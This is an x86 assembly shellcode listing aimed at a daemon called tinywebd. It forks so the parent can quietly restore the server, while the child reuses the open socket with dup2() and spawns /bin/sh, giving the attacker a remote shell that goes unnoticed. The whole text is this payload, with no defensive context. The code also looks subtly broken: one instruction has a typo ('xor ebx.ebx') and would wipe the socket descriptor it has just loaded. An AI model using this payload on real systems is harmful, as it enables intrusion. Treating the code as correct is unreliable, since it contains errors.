BITS  32

push BYTE 0x02          ; fork() - syscall #2
pop  eax                ; put 2 in EAX
int  0x80               ; call fork()
test eax,eax            ;
jz   child_process      ; jump if zero flag is set

; parent process , restore tinywebd
lea  ebp,[esp+0x68]     ; Restore EBP
push 0x08048fb7         ; push the return address
ret                     ; jump to the return address

child_process:
; Reuse the existing socket
lea  edx,[esp+0x5c]     ; address of new_sockfd in edx
mov  ebx,[edx]          ; put the address in EBX
push BYTE 0x02          ;
pop  ecx                ; starting ECX at 2
xor  eax,eax            ; zero out EAx
xor  ebx.ebx            ; zero out EBX

dup_loop:
mov  BYTE al,0x3f       ; dup2() syscall #63
int  0x80               ; dup2(c,0)
dec  ecx                ; count down to 0
jns  dup_loop           ; jump if sign flag is not set

; execve(filename,argv[],envp[])
mov  BYTE al,11         ; execve() syscall #11
push edx                ; put null in stack for termination
push 0x68732f2f         ; //sh
push 0x6e69622f         ; /bin
mov  ebx,esp            ; put address of /bin//sh in EBX
push edx                ; null terminator
mov  edx,esp            ; empty array for envp[]
push ebx                ; push string addr for argv[]
mov  ecx,esp            ; argv[] ptr
int  0x80               ; execve("/bin//sh",["/bin//sh",NULL],NULL)
